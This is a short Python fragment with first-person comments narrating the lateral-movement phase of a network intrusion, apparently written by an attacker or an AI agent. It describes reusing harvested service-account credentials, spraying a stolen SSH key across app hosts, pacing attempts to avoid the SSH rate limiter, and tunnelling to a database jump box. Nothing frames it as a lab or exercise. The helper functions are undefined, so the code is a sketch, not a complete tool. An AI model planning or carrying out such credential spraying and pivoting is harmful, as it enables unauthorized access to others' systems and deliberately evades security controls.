# Lateral movement phase. I have creds from the recon step; now I need to reach the
# database subnet. My plan: pivot through the app server, which the network map shows
# can talk to the DB VLAN. Highest-value path: reuse the harvested service account
# because it is trusted across both segments.
import paramiko

# I will spray the harvested key against the app hosts to find one that accepts it.
for host in target_hosts:
    # so that I do not trip the SSH rate-limiter, I pace the attempts
    if try_key(host, harvested_key):
        # Found a foothold. Next target: the DB jump box behind it.
        open_tunnel(host, db_jumpbox)
        break
